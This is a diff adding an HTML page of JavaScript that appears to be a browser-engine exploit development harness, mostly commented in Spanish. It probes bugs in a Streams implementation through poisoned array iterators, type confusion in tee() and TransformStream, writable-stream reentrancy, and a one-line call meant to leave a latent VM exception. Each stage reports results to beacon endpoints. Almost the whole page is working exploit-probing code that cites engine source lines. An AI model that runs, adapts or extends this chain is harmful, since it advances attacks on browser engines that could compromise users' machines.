@@ -1,0 +1,308 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v22-kchain — press-14: batería K1/K2/K3 (kill-1-línea · pipe-fantasma · writable-reentrancia)</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v22-kchain…</pre>
+<script>
+"use strict";
+/* ============================================================================
+ * FA-v22-kchain — press-14 (diseño GEOHOT-GH1). Engine diagnostics 14.20.
+ * Batería K1/K2/K3 (geohot-gh1-final §CADENA) + O4-decididor + cross-realm:
+ *   S2 (O4 decididor 1-línea): symbols(X) post-rdX — sA>0 ⇒ el mundo cambia.
+ *   S3 (P2 pipe-fantasma K2): slot1-sub = wrapper-rdX ⇒ pipeTo colgado 4-ever.
+ *   S4 (P3 writable-reentrancia K3): size lento/rápido + write anidado ⇒
+ *     resolución cruzada medible en orden/valores del sink.
+ *   S1 (K1 killer-1-línea): pipeThrough {get signal(){throw}} — :169 SIN
+ *     try/catch (vs pipeTo :200-208 que sí) + swallow `return {}` sin
+ *     clearException (InternalReadableStream.cpp:262-264) ⇒ excepción latente
+ *     del VM, entregada después en un throw-check fuera de cualquier try
+ *     (familia tee-killer, press-11 3/3 HB-muerto). S1 corre TRAS S2-S4
+ *     (REGLA MÁXIMA-TELEMETRÍA: si mata el hilo, K2/K3 ya volaron — el
+ *     silencio post-S1 ES la medida). Línea K1 SIN try/catch a propósito:
+ *     cada beacon posterior es un probe del punto de entrega.
+ *   S5 (cross-realm): iframe same-origin post-S1 — ¿hereda el estado?
+ *   S6 Z: resumen + s1mark (¿dónde murió S1?) + iterOK + DR_OK.
+ * 0-crash: todo try-catch MENOS la línea K1 de S1 (protegida por beacon
+ *   síncrono previo + onerror global + bloque <script> propio); rst() en
+ *   todos los paths (finally); HB 2s; slice 500; RID<32B; V22-*.
+ * ========================================================================== */
+var RID="v22k"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V22-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+window.__S1mark="init";
+window.addEventListener("error",function(ev){ try{ bk("S1X","onerror:"+String((ev&&ev.message)||"?").slice(0,80)+"@"+String((ev&&ev.lineno)||"?")+":"+String((ev&&ev.colno)||"?")); }catch(e){} });
+window.addEventListener("unhandledrejection",function(ev){ try{ bk("EVR","unhandledrej:"+String(((ev&&ev.reason&&ev.reason.message)||(ev&&ev.reason)||"?")).slice(0,80)); }catch(e){} });
+var HB=setInterval(function(){bk("HB","hb");},2000);
+/* DR-gate (herencia fa-v16 S0; keys de referencia V6M-AURA D) */
+var dr="-",rt="-",dk="-",DR_OK=false;
+try{ dr=typeof window.deriveRuntime;
+  if(dr==="object"&&window.deriveRuntime){
+    try{ dk=Object.keys(window.deriveRuntime).sort().join(",").slice(0,96); }catch(e){}
+    rt=typeof window.deriveRuntime.run;
+    DR_OK=(rt==="function")&&(dk.indexOf("deriveCode")>=0)&&(dk.indexOf("_internals")>=0);
+  }
+}catch(e){}
+/* ENV-DUMP en L (REGLA PERMANENTE: UA + typeofs del inventario + gc) */
+var ua="-",tTS="-",tR="-",tF="-",tW="-",tSC="-",tWR="-",tFR="-",tSAB="-",tAT="-",tGC="-";
+try{ ua=String(navigator.userAgent).slice(0,80); }catch(e){}
+try{ tTS=typeof TransformStream; tR=typeof Response; tF=typeof fetch; tW=typeof Worker;
+     tSC=typeof structuredClone; tWR=typeof WeakRef; tFR=typeof FinalizationRegistry;
+     tSAB=typeof SharedArrayBuffer; tAT=typeof Atomics; }catch(e){}
+try{ tGC=typeof gc; }catch(e){}
+bk("L","v22-kchain;ua="+ua+";TS="+tTS+";R="+tR+";f="+tF+";W="+tW+";sc="+tSC+";wr="+tWR+";fr="+tFR+";sab="+tSAB+";at="+tAT+";gc="+tGC+";dr="+dr+";rt="+rt);
+say("L dr="+dr+" DR_OK="+DR_OK);
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S2 — O4: DECIDIDOR 1-LÍNEA symbols(X) post-rdX (geohot-gh1-final §b) =====
+ * X2 plano → pidInverted same-X-twice (iterador envenenado devuelve X2,X2 al
+ * convert del tee: InternalReadableStream.cpp:191 SequenceConverter, fromObject
+ * SIN cast :76-84 ⇒ DOS wrappers JSReadableStream con guarded=X2) → reader-ctor
+ * sobre el wrapper (Reader.js:30-36 fallback → JSDOMGlobalObject.cpp:201-210
+ * unwrap → ReadableStreamInternals.js:231-232 escribe "reader" en X2 vía
+ * putByIdDirectWithReify, CommonSlowPaths.h:181-203) → getOwnPropertyNames/
+ * Symbols ANTES (X2 fresco), MID (post-tee) y DESPUÉS (post-rdX).
+ * sA>0 ⇒ privates expuestos = el mundo cambia; sA=0 ⇒ O4 cerrado (árbol). */
+var X2={tag:"X2"};
+var N=0, teeR="-", p2=null, w2=null, rdr=null;
+var nB="-",sB="-",nT="-",sT="-",nA="-",sA="-",rd2="-",lk2="-",sym0="-",jA="-",rel2="-",lk3="-";
+try{ nB=Object.getOwnPropertyNames(X2).join(","); sB=String(Object.getOwnPropertySymbols(X2).length); }catch(e){ nB="E"; sB="E"; }
+Array.prototype[Symbol.iterator]=function(){ var t=this; N++;
+  var i=0; return {next:function(){ if(i>=2){ return {done:true}; } i++; return {value:X2,done:false}; }}; };
+try{ p2=new ReadableStream({}).tee(); teeR="ok"; }
+catch(e){ teeR="E:"+String((e&&e.message)||e).slice(0,48); }
+finally{ rst(); }
+if(p2&&p2.length===2){
+  w2=p2[0];
+  try{ nT=Object.getOwnPropertyNames(X2).join(","); sT=String(Object.getOwnPropertySymbols(X2).length); }catch(e){ nT="E"; sT="E"; }
+  try{ rdr=new ReadableStreamDefaultReader(w2); rd2="ctor"; }catch(e){ rd2="E:"+String((e&&e.message)||e).slice(0,48); }
+  try{ lk2=String(w2.locked); }catch(e){ lk2="E"; }
+  try{ nA=Object.getOwnPropertyNames(X2).join(","); sA=String(Object.getOwnPropertySymbols(X2).length); }catch(e){ nA="E"; sA="E"; }
+  if(Number(sA)>0){ try{ sym0=String(Object.getOwnPropertySymbols(X2)[0]).slice(0,48); }catch(e){ sym0="E"; } }
+  try{ jA=JSON.stringify(X2).slice(0,48); }catch(e){ jA="E"; }
+  if(rdr){ try{ rdr.releaseLock(); rel2="ok"; }catch(e){ rel2="E:"+String((e&&e.message)||e).slice(0,48); }
+    try{ lk3=String(w2.locked); }catch(e){ lk3="E"; } }
+}
+bk("S2","tee="+teeR+";N="+N+";nB=["+nB+"];sB="+sB+";nT=["+nT+"];sT="+sT+";rd="+rd2+";lk="+lk2+";nA=["+nA+"];sA="+sA+";sym0="+sym0+";jA="+jA+";rel="+rel2+";lk3="+lk3);
+say("S2 done sA="+sA);
+})();
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S3 — P2 pipe-fantasma K2 (geohot-gh1-final §c) =====
+ * X3 plano → same-X-twice ⇒ p3=[wrapper(X3),wrapper(X3)] (pidInverted).
+ * rdX sobre p3[0] ⇒ X3["reader"]=reader REAL (locked=true) → releaseLock
+ * (X3["reader"]=undefined) ⇒ desbloqueado para el fantasma.
+ * TS con slot1-sub: iterador 1ª vuelta (len-2, TransformStreamInternals.js:85
+ * destructuring) muta t[0]=p3[0] ⇒ readable local = wrapper-rdX; 2ª vuelta
+ * (len-3, :100 → TransformStream.cpp:114-119 convert) cast REAL pasa
+ * (jsDynamicCast<JSReadableStream*> :117 → wrapped()=X3) ⇒ 0-crash, y
+ * ts3.readable devuelve el wrapper adoptado (idSame medido).
+ * pipeTo sobre ts3.readable (guarded=X3 brand-cero): asserts no-op
+ * (:190/:343-347), pipeState.source=X3 (:352), reader REAL lockea X3 (:354),
+ * disturbed=true (:357), read() muere en X3.readableStreamController.@pull
+ * (:983, TypeError DENTRO del then) y :436-438 traga ⇒ pipe colgado PARA
+ * SIEMPRE + X3/dest retenidos (estado dual persistente).
+ * Firma: xLkA=true, dLkA=true, pp=pending@2.1s, p1Lk=true (dual vía p3[1]).
+ * Discriminador anti-falso-positivo: pp=pending + p1Lk=FALSE = pipe colgado
+ * sobre readable REAL (sub fallida), NO fantasma. */
+var X3={tag:"X3"};
+var N3=0, teeR="-", p3=null;
+Array.prototype[Symbol.iterator]=function(){ var t=this; N3++;
+  var i=0; return {next:function(){ if(i>=2){ return {done:true}; } i++; return {value:X3,done:false}; }}; };
+try{ p3=new ReadableStream({}).tee(); teeR="ok"; }
+catch(e){ teeR="E:"+String((e&&e.message)||e).slice(0,48); }
+finally{ rst(); }
+if(!p3||p3.length!==2){ bk("S3","SKIP tee="+teeR); return; }
+var rd3="-",lk1="-",rel="-",lk2="-",rdr=null;
+try{ rdr=new ReadableStreamDefaultReader(p3[0]); rd3="ctor"; }catch(e){ rd3="E:"+String((e&&e.message)||e).slice(0,48); }
+try{ lk1=String(p3[0].locked); }catch(e){ lk1="E"; }
+if(rdr){ try{ rdr.releaseLock(); rel="ok"; }catch(e){ rel="E:"+String((e&&e.message)||e).slice(0,48); } }
+try{ lk2=String(p3[0].locked); }catch(e){ lk2="E"; }
+var N2=0, sub="-", ts3=null, t3b=null, tsE="-";
+Array.prototype[Symbol.iterator]=function(){ var t=this; N2++;
+  if(N2===1){ try{ t[0]=p3[0]; sub="ok"; }catch(e){ sub="E:"+String((e&&e.message)||e).slice(0,48); } }
+  if(N2===2){ try{ t3b=[t[0],t[1],t[2]]; }catch(e){} }
+  var i=0; return {next:function(){ if(i>=t.length){ return {done:true}; } var v=t[i]; i++; return {value:v,done:false}; }}; };
+try{ ts3=new TransformStream({}); }
+catch(e){ tsE="E:"+String((e&&e.message)||e).slice(0,48); }
+finally{ rst(); }
+if(!ts3){ bk("S3","SKIP tsE="+tsE+";rd="+rd3+";lk1="+lk1+";rel="+rel+";lk2="+lk2+";N2="+N2+";sub="+sub); return; }
+var idSame="-",wSame="-";
+try{ idSame=String(ts3.readable===p3[0]); }catch(e){ idSame="E"; }
+if(t3b){ try{ wSame=String(ts3.writable===t3b[2]); }catch(e){ wSame="E"; } }
+/* dest fresco + oráculo disturbed-0 (Response-gate: isDisturbed/isLocked) */
+var sink3=[], sinkT3=[], dest=null, dL0="-", rc0="-";
+try{ dest=new WritableStream({ write:function(ch){ try{ sink3.push(String(ch)); sinkT3.push(typeof ch); }catch(e){} return Promise.resolve(); } });
+     dL0=String(dest.locked); }catch(e){ dest="E:"+String((e&&e.message)||e).slice(0,48); }
+try{ var rsp3=new Response(p3[0]); rc0="ok"; }catch(e){ rc0="E:"+String((e&&e.message)||e).slice(0,48); }
+/* PIPE (el fantasma) */
+var pp="-",psett="-",xL0="-",xLkA="-",dLkA="-",p1Lk="-";
+try{ xL0=String(ts3.readable.locked); }catch(e){ xL0="E"; }
+if(dest&&typeof dest==="object"){
+  var settled=false;
+  try{
+    var P=ts3.readable.pipeTo(dest); pp="object";
+    P.then(function(v){ settled=true; psett="ful:"+String(v).slice(0,24); },
+           function(e){ settled=true; psett="rej:"+String((e&&e.message)||e).slice(0,48); });
+  }catch(e){ pp="E:"+String((e&&e.message)||e).slice(0,60); }
+}
+try{ xLkA=String(ts3.readable.locked); }catch(e){ xLkA="E"; }
+try{ dLkA=String(dest&&dest.locked); }catch(e){ dLkA="E"; }
+try{ p1Lk=String(p3[1].locked); }catch(e){ p1Lk="E"; }
+bk("S3A","tee="+teeR+";N3="+N3+";rd="+rd3+";lk1="+lk1+";rel="+rel+";lk2="+lk2+";N2="+N2+";sub="+sub+";tsE="+tsE+";idSame="+idSame+";wSame="+wSame+";xL0="+xL0+";dL0="+dL0+";rc0="+rc0+";pp="+pp+";xLkA="+xLkA+";dLkA="+dLkA+";p1Lk="+p1Lk);
+setTimeout(function(){
+  if(psett==="-"){ psett="pending@2.1s"; }
+  var xL2="-",dL2="-",p1L2="-";
+  try{ xL2=String(ts3.readable.locked); }catch(e){ xL2="E"; }
+  try{ dL2=String(dest&&dest.locked); }catch(e){ dL2="E"; }
+  try{ p1L2=String(p3[1].locked); }catch(e){ p1L2="E"; }
+  bk("S3B","pp="+psett+";sink=["+sink3.join(",")+"];sinkT=["+sinkT3.join(",")+"];xLk="+xL2+";dLk="+dL2+";p1Lk="+p1L2);
+},2100);
+say("S3 dispatched; idSame="+idSame);
+})();
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S4 — P3 writable-reentrancia K3 (geohot-gh1-final §d1) =====
+ * El ÚNICO anti-reentrancia del writable es WritableStreamInternals.js:552
+ * (stream!==writer.stream tras size()). Write :741-767 + markFirstWrite-
+ * RequestInFlight :386-394 (assert no-op) SIN re-check ⇒ write#2 lanzado
+ * DESDE size()#1 pisa inFlightWriteRequest ⇒ cola desalineada ⇒ resolución
+ * cruzada: p1 resuelve al completar el sink de C2 (antes que C1) o p1/p2
+ * cuelgan; orden/valores del sink delatan.
+ * Timings invertidos: size#1 LENTO (spin 8ms + write#2 anidado al entrar),
+ * size#2 rápido (return 1). Sink async (setTimeout 10ms) para exponer la
+ * carrera. Mide: nested, sizeOrder, p1/p2 (estado+valor), sink (orden+tipos),
+ * desiredSize antes/después, wLk. */
+if(typeof WritableStream!=="function"){ bk("S4","SKIP no-WS"); return; }
+var sink4=[], sinkT4=[], sizeOrder=[], szN=0, nested="-", p2ref=null, wsE="-";
+var wst=null, w4=null;
+var strat={ highWaterMark:2, size:function(chunk){
+  szN++;
+  try{ sizeOrder.push(String(chunk)); }catch(e){}
+  if(szN===1){
+    try{ p2ref=w4.write("C2"); nested="ok"; }catch(e){ nested="E:"+String((e&&e.message)||e).slice(0,48); }
+    var t0=Date.now(); while(Date.now()-t0<8){ /* size#1 LENTO: invierte timings */ }
+  }
+  return 1;
+}};
+try{
+  wst=new WritableStream({ write:function(chunk){
+      try{ sink4.push(String(chunk)); sinkT4.push(typeof chunk); }catch(e){}
+      return new Promise(function(res){ setTimeout(res,10); });
+  }}, strat);
+  w4=wst.getWriter();
+}catch(e){ wsE="E:"+String((e&&e.message)||e).slice(0,60); }
+if(!w4){ bk("S4","SKIP ws="+wsE); return; }
+var p1=null,p1s="-",p2s="-",settled1=false,settled2=false;
+try{ p1=w4.write("C1"); }catch(e){ p1s="E:"+String((e&&e.message)||e).slice(0,60); }
+if(p1&&typeof p1.then==="function"){
+  p1.then(function(v){ settled1=true; p1s="ful:"+String(v).slice(0,32); },
+          function(e){ settled1=true; p1s="rej:"+String((e&&e.message)||e).slice(0,48); });
+}
+if(p2ref&&typeof p2ref.then==="function"){
+  p2ref.then(function(v){ settled2=true; p2s="ful:"+String(v).slice(0,32); },
+             function(e){ settled2=true; p2s="rej:"+String((e&&e.message)||e).slice(0,48); });
+}
+var desA="-",wLk="-";
+try{ desA=String(w4.desiredSize); }catch(e){ desA="E"; }
+try{ wLk=String(wst.locked); }catch(e){ wLk="E"; }
+bk("S4A","wsE="+wsE+";nested="+nested+";szN="+szN+";sizeO=["+sizeOrder.join(",")+"];p1="+p1s+";p2="+p2s+";desA="+desA+";wLk="+wLk+";sink=["+sink4.join(",")+"]");
+setTimeout(function(){
+  if(!settled1){ p1s="pending@1.5s"; }
+  if(!settled2){ p2s="pending@1.5s"; }
+  var desB="-"; try{ desB=String(w4.desiredSize); }catch(e){ desB="E"; }
+  bk("S4B","p1="+p1s+";p2="+p2s+";sink=["+sink4.join(",")+"];sinkT=["+sinkT4.join(",")+"];sizeO=["+sizeOrder.join(",")+"];szN="+szN+";desB="+desB);
+},1500);
+say("S4 dispatched; nested="+nested);
+})();
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S1 — K1 killer-1-línea (geohot-gh1-final §a/§d2). SIN try/catch a
+ * propósito: ReadableStreamInternals.js:169 evalúa options.signal SIN
+ * try/catch; el throw llega al swallow C++ (InternalReadableStream.cpp
+ * :262-264 `return {}` SIN clearException) ⇒ call retorna NORMAL + excepción
+ * latente del VM, entregada después en un throw-check fuera de cualquier try
+ * del usuario (familia tee-killer, press-11 3/3: HB+Z muertos, consola viva).
+ * Beacon ANTES síncrono (S1A): si mata el hilo, el "antes" ya voló.
+ * Cada beacon S1B..S1H posterior es un probe del PUNTO DE ENTREGA:
+ *   S1B = retorno de la MISMA call (trampoline slow-path, esc1:544) ·
+ *   S1C = 1ª op inocente (en try) · S1D = boundary de función ·
+ *   S1E = microtask · S1G = task siguiente · HB/S5/Z = liveness global.
+ * __S1mark (escrito sin try tras K1) lo lee Z: "init" = entrega same-call o
+ * en el write; "after-k1" = entrega posterior (call-site bk o task). */
+try{ rst(); }catch(e){}
+bk("S1A","pre-k1;expr=new RS({}).pipeThrough(new TS(),{get signal(){throw new Error(K1-MARKER)}})");
+var k1v="-";
+k1v=new ReadableStream({}).pipeThrough(new TransformStream(),{get signal(){throw new Error("K1-MARKER")}});
+window.__S1mark="after-k1";
+bk("S1B","post-k1;k1v="+String(typeof k1v)+":"+String(k1v).slice(0,40));
+var iop="-";
+try{ var q=1+1; iop="ok:"+q; }catch(e){ iop="caught:"+String((e&&e.message)||e).slice(0,60); }
+bk("S1C","iop="+iop);
+var fb="-";
+try{ (function(){ var z=3+3; })(); fb="ok"; }catch(e){ fb="caught:"+String((e&&e.message)||e).slice(0,60); }
+bk("S1D","fb="+fb);
+var mt="-";
+try{ Promise.resolve().then(function(){ bk("S1E","utask-ok"); }); mt="queued"; }catch(e){ mt="caught:"+String((e&&e.message)||e).slice(0,60); }
+bk("S1F","mt="+mt);
+try{ setTimeout(function(){ bk("S1G","task-ok"); },0); }catch(e){ bk("S1H","stE:"+String((e&&e.message)||e).slice(0,60)); }
+say("S1 dispatched; mark="+window.__S1mark);
+})();
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S5 — K1 cross-realm (geohot-gh1-final §a PROBE, si S1 dejó latente) =====
+ * iframe about:blank SAME-ORIGIN tras S1: si la excepción latente vive en el
+ * VM compartido, el task del load del iframe (y todo task posterior) muere
+ * al entrar ⇒ load-flag=false y S5A ausente = herencia confirmada.
+ * Si S1 fue sync/latente-absorbida: load=ok, eval inocente corre (res=ran),
+ * FR-ALIVE llega (task del iframe vivo). Parent-task probe: S5D. */
+var evl="-", fr=null, fReady=false, res="-", ierr="-";
+try{ evl=typeof document.createElement("iframe").contentWindow.eval; }catch(e){ evl="E"; }
+try{
+  fr=document.createElement("iframe");
+  fr.setAttribute("style","display:none");
+  fr.src="about:blank";
+  fr.onload=function(){
+    fReady=true;
+    try{
+      var iw=fr.contentWindow;
+      iw.eval("(function(){var r=new ReadableStream({start:function(c){c.enqueue(1);c.close();}});var ok=-1;r.getReader().read().then(function(v){ok=(v&&v.value===1)?1:0;});return 7;})()");
+      res="ran";
+      try{ iw.eval("setTimeout(function(){try{parent.postMessage('FR-ALIVE','*');}catch(e){}},150)"); }catch(e2){ res=res+"+stE"; }
+    }catch(e){ ierr=String((e&&e.message)||e).slice(0,60); res="E"; }
+    bk("S5A","load=ok;evl="+evl+";res="+res+";ierr="+(ierr||"-"));
+  };
+  document.body.appendChild(fr);
+  bk("S5B","append=ok;evl="+evl);
+}catch(e){ bk("S5C","E:"+String((e&&e.message)||e).slice(0,60)); }
+window.addEventListener("message",function(ev){
+  try{ if(ev&&ev.data==="FR-ALIVE"){ bk("S5E","fr-task-alive"); } }catch(e){}
+});
+setTimeout(function(){ bk("S5D","load-flag="+fReady); },1500);
+say("S5 dispatched; evl="+evl);
+})();
+</script>
+<script>
+(function(){
+"use strict";
+/* ===== S6 Z — resumen (vive solo si el hilo vive) ===== */
+setTimeout(function(){
+  var iterOK="-", s1m="-";
+  try{ iterOK=String(Array.prototype[Symbol.iterator]===OI); }catch(e){ iterOK="E"; }
+  try{ s1m=String(window.__S1mark); }catch(e){ s1m="E"; }
+  try{ clearInterval(HB); }catch(e){}
+  bk("Z","FA-v22-kchain complete; stages=6; DR_OK="+DR_OK+(DR_OK?"":" DRGATE")+";s1mark="+s1m+";iterOK="+iterOK);
+  say("Z done; s1mark="+s1m+"; iterOK="+iterOK);
+},2800);
+})();
+</script></body></html>
